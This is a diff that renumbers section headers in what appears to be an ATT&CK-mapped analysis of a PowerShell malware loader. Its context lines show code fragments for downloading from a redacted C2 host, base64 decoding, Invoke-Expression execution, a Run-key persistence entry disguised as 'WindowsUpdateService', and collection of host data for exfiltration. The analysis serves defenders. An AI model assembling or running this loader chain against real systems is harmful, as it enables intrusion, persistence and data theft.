@@ -4,7 +4,7 @@
 
 ================================================================================
 
-[BOOTSTRAP]
+[ 1 | BOOTSTRAP ]
 
     $ErrorActionPreference = <silenced>
     $ProgressPreference    = <silenced>
@@ -29,7 +29,7 @@ ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
 
 ================================================================================
 
-[ENV_AWARENESS]
+[ 2 | ENV_AWARENESS ]
 
     $hostName = [Environment]::GetEnvironmentVariable(<COMPUTERNAME>)
     $userName = [Environment]::GetEnvironmentVariable(<USERNAME>)
@@ -68,7 +68,7 @@ ATT&CK: [ T1082 ] System Information Discovery
 
 ================================================================================
 
-[C2_PROFILE]
+[ 3 | C2_PROFILE ]
 
     $c2Endpoint    = <https://[redacted].example.com/payload>
     $exfilEndpoint = <https://[redacted].example.com/exfil>
@@ -96,7 +96,7 @@ ATT&CK: [ T1071.001 ] Application Layer Protocol: Web Protocols
 
 ================================================================================
 
-[MEMORY_RETRIEVAL]
+[ 4 | MEMORY_RETRIEVAL ]
 
     $client = New-Object <Net.WebClient>
     $client.Headers.Add(<User-Agent>, $userAgent)
@@ -135,7 +135,7 @@ ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
 
 ================================================================================
 
-[DECODE_STAGE]
+[ 5 | DECODE_STAGE ]
 
     $decodedBytes   = [Convert]::<FromBase64String>($encodedPayload)
     $decodedPayload = [Text.Encoding]::Unicode.<GetString>($decodedBytes)
@@ -164,7 +164,7 @@ ATT&CK: [ T1027 ] Obfuscated Files or Information
 
 ================================================================================
 
-[RUNTIME_EXECUTION]
+[ 6 | RUNTIME_EXECUTION ]
 
     <Invoke-Expression> $decodedPayload     # MOST COMMON
 
@@ -201,7 +201,7 @@ ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
 
 ================================================================================
 
-[PERSISTENCE]
+[ 7 | PERSISTENCE ]
 
     $regPath   = <HKCU:\Software\Microsoft\Windows\CurrentVersion\Run>
     $entryName = <WindowsUpdateService>
@@ -233,7 +233,7 @@ ATT&CK: [ T1547.001 ] Boot or Logon Autostart Execution: Registry Run Keys
 
 ================================================================================
 
-[COLLECTION_EXFIL]
+[ 8 | COLLECTION_EXFIL ]
 
     $sysInfo = @{
         Hostname     = [Environment]::GetEnvironmentVariable(<COMPUTERNAME>)
@@ -276,7 +276,7 @@ ATT&CK: [ T1082 ] System Information Discovery
 
 ================================================================================
 
-[ANALYST_NOTES]
+[ ANALYST_NOTES ]
 
 REVERSE ENGINEERING INDICATORS:
 - IMPORTS TO FLAG:
